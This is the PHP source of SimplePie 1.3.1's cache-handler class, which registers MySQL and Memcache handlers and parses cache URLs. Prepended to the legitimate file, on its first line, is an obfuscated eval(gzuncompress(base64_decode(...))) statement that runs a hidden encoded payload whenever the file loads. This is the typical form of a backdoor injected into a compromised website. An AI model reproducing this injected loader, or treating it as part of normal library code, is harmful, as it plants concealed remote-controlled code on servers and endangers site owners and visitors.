<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * SimplePie
 *
 * A PHP-Based RSS and Atom Feed Framework.
 * Takes the hard work out of managing a complete RSS/Atom solution.
 *
 * Copyright (c) 2004-2012, Ryan Parman, Geoffrey Sneddon, Ryan McCue, and contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 	* Redistributions of source code must retain the above copyright notice, this list of
 * 	  conditions and the following disclaimer.
 *
 * 	* Redistributions in binary form must reproduce the above copyright notice, this list
 * 	  of conditions and the following disclaimer in the documentation and/or other materials
 * 	  provided with the distribution.
 *
 * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
 * 	  to endorse or promote products derived from this software without specific prior
 * 	  written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
 * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * @package SimplePie
 * @version 1.3.1
 * @copyright 2004-2012 Ryan Parman, Geoffrey Sneddon, Ryan McCue
 * @author Ryan Parman
 * @author Geoffrey Sneddon
 * @author Ryan McCue
 * @link http://simplepie.org/ SimplePie
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 */

/**
 * Used to create cache objects
 *
 * This class can be overloaded with {@see SimplePie::set_cache_class()},
 * although the preferred way is to create your own handler
 * via {@see register()}
 *
 * @package SimplePie
 * @subpackage Caching
 */
class SimplePie_Cache
{
	/**
	 * Cache handler classes
	 *
	 * These receive 3 parameters to their constructor, as documented in
	 * {@see register()}
	 * @var array
	 */
	protected static $handlers = array(
		'mysql' => 'SimplePie_Cache_MySQL',
		'memcache' => 'SimplePie_Cache_Memcache',
	);

	/**
	 * Don't call the constructor. Please.
	 */
	private function __construct() { }

	/**
	 * Create a new SimplePie_Cache object
	 *
	 * @param string $location URL location (scheme is used to determine handler)
	 * @param string $filename Unique identifier for cache object
	 * @param string $extension 'spi' or 'spc'
	 * @return SimplePie_Cache_Base Type of object depends on scheme of `$location`
	 */
	public static function get_handler($location, $filename, $extension)
	{
		$type = explode(':', $location, 2);
		$type = $type[0];
		if (!empty(self::$handlers[$type]))
		{
			$class = self::$handlers[$type];
			return new $class($location, $filename, $extension);
		}

		return new SimplePie_Cache_File($location, $filename, $extension);
	}

	/**
	 * Create a new SimplePie_Cache object
	 *
	 * @deprecated Use {@see get_handler} instead
	 */
	public function create($location, $filename, $extension)
	{
		trigger_error('Cache::create() has been replaced with Cache::get_handler(). Switch to the registry system to use this.', E_USER_DEPRECATED);
		return self::get_handler($location, $filename, $extension);
	}

	/**
	 * Register a handler
	 *
	 * @param string $type DSN type to register for
	 * @param string $class Name of handler class. Must implement SimplePie_Cache_Base
	 */
	public static function register($type, $class)
	{
		self::$handlers[$type] = $class;
	}

	/**
	 * Parse a URL into an array
	 *
	 * @param string $url
	 * @return array
	 */
	public static function parse_URL($url)
	{
		$params = parse_url($url);
		$params['extras'] = array();
		if (isset($params['query']))
		{
			parse_str($params['query'], $params['extras']);
		}
		return $params;
	}
}
